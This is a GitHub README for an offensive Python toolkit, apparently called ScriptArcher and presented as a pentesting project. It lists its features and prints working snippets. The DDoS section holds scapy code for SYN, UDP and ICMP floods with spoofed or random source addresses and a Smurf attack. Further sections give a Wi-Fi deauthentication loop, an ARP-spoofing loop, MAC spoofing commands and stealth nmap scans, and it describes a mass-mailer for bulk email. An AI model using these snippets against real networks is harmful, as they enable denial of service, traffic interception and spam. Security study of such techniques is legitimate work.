<p align="center">
  <img 
    width="150"
    height="150"
    src="https://github.com/AdolfMacro/AdolfMacro/blob/main/logo.png"
  >
</p>

## ScriptArcher Open source small project for pentesting : 

### Contents :


* [Options](https://github.com/AdolfMacro/ScriptArcher#options-)
* [Dependencies](https://github.com/AdolfMacro/ScriptArcher#dependencies)
* [How it works : ](https://github.com/AdolfMacro/ScriptArcher#how-it-works-)
	* [IPv6 finder tool](https://github.com/AdolfMacro/ScriptArcher#ipv6-finder-tool-)
	* [Mass Mailer Attack tool](https://github.com/AdolfMacro/ScriptArcher#mass-mailer-attack-tool-)
	* [Scan](https://github.com/AdolfMacro/ScriptArcher#scan-)
	* [DDoS](https://github.com/AdolfMacro/ScriptArcher#ddos-)
	* [Deauthentication Attacks](https://github.com/AdolfMacro/ScriptArcher#deauthentication-attacks-)
	* [Mac Spoofing](https://github.com/AdolfMacro/ScriptArcher#mac-spoofing-)
	* [Arp spoofing](https://github.com/AdolfMacro/ScriptArcher#arp-spoofing-)
	* [dBm Analyzer](https://github.com/AdolfMacro/ScriptArcher#dbm-analyzer-)
* [Screenshots](https://github.com/AdolfMacro/ScriptArcher#screenshots-)
* [Installation](https://github.com/AdolfMacro/ScriptArcher#installation-)


----

### Options :
1. Get your ipv6
2. Mass Mailer Attack
3. Scan :
   - 1.Port scanning
   - 2.IP scanning
   - 3.IP range scanning
   - 4.Scan popular ports
   - 5.Sweep Network
   - 6.Zombie scan
   - 7.Half open scan
4. DDoS :
   - 1.ICMP attack
   - 2.Smurf attack
   - 3.TCP state existing
   - 4.UDP flooding
5. Deauthentication Attacks
6. Mac Spoofing
7. Arp spoofing
8. dBm Analyzer
---
### Dependencies:
Libraries :
- scapy
- socket
- colorama
- contextlib
- email
- getpass
- requests

Tools :
- iw
- net-tools
- nmap
- aircrack-ng
---
### How it works :
> Brief descriptions :

- #### IPv6 finder tool :

	By sending a request to https://www.whoismyisp.org/, it will receive your IP and ISP information .
```
re=get("https://www.whoismyisp.org/")
```


- #### Mass Mailer Attack tool :

	Receives an email from you as the sender and a list of recipients then enters your email and sends the same email to all emails in the list.

**syntax of mailing file**:


  ```
  example@example.com
  example2@example.com
  example3@example.com
  and ...
  ```

 It then asks you for an smtp server address including port and address. A list of the most popular smtp servers:

      Gmail : smtp.gmail.com 587
      Outlook(hotmail) : smtp-mail.outlook.com 587
      Yahoo : smtp.mail.yahoo.com 465

   It will then ask you for the original text of the email (**enter the ^C to finish writing**)
#### Note:
To use this tool, you must enable the Less secure app access option in your Google Account settings. To activate, go to the following link:
https://www.google.com/settings/security/lesssecureapps
If you do not know what Less secure app access is, refer to the following link:
	https://support.google.com/accounts/answer/6010255?hl=en

- #### Scan :
	This part of the tool performs a series of scans using NMAP.
	##### Options :
	1. **Port scanning** :

		This part of the tool scans a range of ports and displays or saves the result.
		Nmap command :
		```
		nmap -p {rangePort} {host} -o {fileName}		
		```
	2. **IP scanning** :

		This part of the tool performs a typical scan and displays or saves the result.

		Nmap command :
		```
		nmap {host} -o {fileName}
		```
	3. **IP range scanning** :

		Scans a range of IPs (basically displays or stores any host that is active in the range of IPs)

		Nmap command :
       ```
		nmap -sp {host}* -o {fileName
		```

	4. **Scan popular ports** :

		Nmap command :
        ```
        nmap --top-ports {number} {host} -o {fileName}
        ```

	5. **Sweep Network** :

		Nmap “ping sweep” is a method to discover connected devices in a network using the nmap security scanner, for a device to be discovered we only need it to be turned on and connected to the network .
        
        Nmap command :
        ```
        nmap -sn {host}/{netmask} -o {fileName}
        ```
	6. **Zombie scan** :
	
		Idle scan, as it has become known, allows for completely blind port scanning. Attackers can actually scan a target without sending a single packet to the target from their own IP address! Instead, a clever side-channel attack allows for the scan to be bounced off a dumb “zombie host”. Intrusion detection system (IDS) reports will finger the innocent zombie as the attacker. Besides being extraordinarily stealthy, this scan type permits discovery of IP-based trust relationships between machines ...[more](https://nmap.org/book/idlescan.html "more")

		Nmap command :
        ```
        nmap -Pn -sI {Zombie host} {Target host} -o {fileName}
        ```
	7. **Half open scan** :
	
		SYN packets request a response from a computer, and an ACK packet is a response. In a typical TCP transaction, there is an  SYN, an ACK from the service, and a third ACK confirming message received.
This scan is fast and hard to detect because it never completes the full TCP 3 way-handshake. The scanner sends an SYN message and just notes the SYN-ACK responses. The scanner doesn’t complete the connection by sending the final ACK: it leaves the target hanging.
Any SYN-ACK responses are possibly open ports. An RST(reset) response means the port is closed, but there is a live computer here. No responses indicate SYN is filtered on the network. An ICMP (or ping) no response also counts as a filtered response.

		Nmap command :
        ```
        nmap -sS {host} -o {fileName}
        ```
- #### DDoS :
	This tool uses scapy to send flooding packets to target .
##### Options 

1. **ICMP attack** :This option send flood of normal icmp packets to target .
    
	Scapy command : 
    ```
    packet = IP(dst=Dst, src=f"{randint(1,200)}.{randint(1,200)}.{randint(1,200)}.{randint(1,200)}")/TCP(sport=randint(1024 ,49151), dport=Dport)
    send(packet)
    ```

2. **Smurf attack**:
The Smurf attack is a distributed denial-of-service attack in which large numbers of Internet Control Message Protocol (ICMP) packets with the intended victim's spoofed source IP are broadcast to a computer network using an IP broadcast address. Most devices on a network will, by default, respond to this by sending a reply to the source IP address. If the number of machines on the network that receive and respond to these packets is very large, the victim's computer will be flooded with traffic. This can slow down the victim's computer to the point where it becomes impossible to work on...[more](https://en.wikipedia.org/wiki/Smurf_attack "more")

	Scapy commands :
    ```
    TCP :packet = IP(dst=Dst, src=Src)/TCP(sport=Sport, dport=Dport,flags="S")
    UDP : packet = IP(dst=Dst, src=Src)/UDP(sport=Sport, dport=Dport)
    ICMP : packet = IP(dst=Dst, src=Src)/ICMP()
    ```
    
3. **TCP state existing** :
    In a SYN flood attack, the attacker sends repeated SYN packets to every port on the targeted server, often using a fake IP address. The server, unaware of the attack, receives multiple, apparently legitimate requests to establish communication. It responds to each attempt with a SYN-ACK packet from each open port.
    
	Scapy command :
    ```
    packet = IP(dst=Dst, src=Src)/TCP(sport=Sport, dport=Dport,flags="S")
    ```
4. **UDP flooding**:
	A UDP flood is a type of denial-of-service attack in which a large number of User Datagram Protocol (UDP) packets are sent to a targeted server with the aim of overwhelming that device’s ability to process and respond. The firewall protecting the targeted server can also become exhausted as a result of UDP flooding, resulting in a denial-of-service to legitimate traffic.
    
	Scapy command :
    ```
    Random mode : packet = IP(dst=Dst, src=f"{randint(1,200)}.{randint(1,200)}.{randint(1,200)}.{randint(1,200)}")/UDP(sport=randint(4096,65535), dport=port)
    Normal attack :packet = IP(dst=Dst, src=Src)/UDP(sport=Sport, dport=port)
    ```

- #### Deauthentication Attacks :
	[Deauthentication Attacks wikipedia page](https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack "Deauthentication Attacks wikipedia page")
    
	Scapy command :
    ```
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet, inter=0.1, count=100000, iface=ifc, verbose=1)
    ```

- #### Mac Spoofing :
	MAC spoofing is a technique for changing a factory-assigned Media Access Control (MAC) address of a network interface on a networked device. The MAC address that is hard-coded on a network interface controller (NIC) cannot be changed. However, many drivers allow the MAC address to be changed. Additionally, there are tools which can make an operating system believe that the NIC has the MAC address of a user's choosing. The process of masking a MAC address is known as MAC spoofing. Essentially, MAC spoofing entails changing a computer's identity, for any reason...[more](https://en.wikipedia.org/wiki/MAC_spoofing "more")
    
	Shell command :

  ```
  sudo ifconfig {interfaceName} down
  sudo ifconfig {interfaceName} hw ether {new mac}
  sudo ifconfig {interfaceName} up
  ```
- #### Arp spoofing :
	[Arp spoofing wikipedia page](https://en.wikipedia.org/wiki/ARP_spoofing "Arp spoofing wikipedia page")
    
	Code :
  ```
  target_ip=input("\n\nEnter the target ip : ")
              spoof_ip=input("\nEnter the spoof ip : ")
              packet = Ether(dst = "ff:ff:ff:ff:ff:ff")/ ARP(pdst = target_ip)
              result = srp(packet , verbose = 0)
              resMac=result[0][0][1].hwsrc
              print(resMac)
              while 1:
                  target_mac = resMac
                  packet = Ether(dst = target_mac) / ARP(psrc=spoof_ip , pdst=target_ip,hwdst = target_mac , op = "is-at")
                  sendp(packet , verbose = 0)
                  print("[*] Packet send !")
  ```
- #### dBm Analyzer :
	[What is dbm(click) ?](https://en.wikipedia.org/wiki/DBm "What is dbm ?")
	
	The dBm Analyzer tool is used to receive the dBm signal and display it .
	Shell command :
  ```
  iw dev {interface name} scan
  ```
	We are given a lot of information using the above command, but this tool separates and displays the DBM section from the rest of the information (this information is constantly updated)
--------
### Screenshots :
<p float="left">
  <img src="/screenshots/1.jpg" width="500" />
  <img src="/screenshots/4.jpg" width="500" /> 
</p>
<p float="left">
  <img src="/screenshots/2.jpg" width="500" />
  <img src="/screenshots/3.jpg" width="500" /> 
</p>

---


### Installation :
```
git clone https://github.com/manikamran/ScriptArcher.git
sudo python3 install.py
```
-----

>Resources used: [varonis.com](https://www.varonis.com/blog/port-scanning-techniques "varonis.com") , [linuxhint.com](https://linuxhint.com/nmap_ping_sweep/ "linuxhint.com") , [nmap.org](http://nmap.org "nmap.org") , [en.wikipedia.org](http://en.wikipedia.org "en.wikipedia.org") , [cloudflare.com](https://www.cloudflare.com/learning/ddos/udp-flood-ddos-attack/ "cloudflare.com")
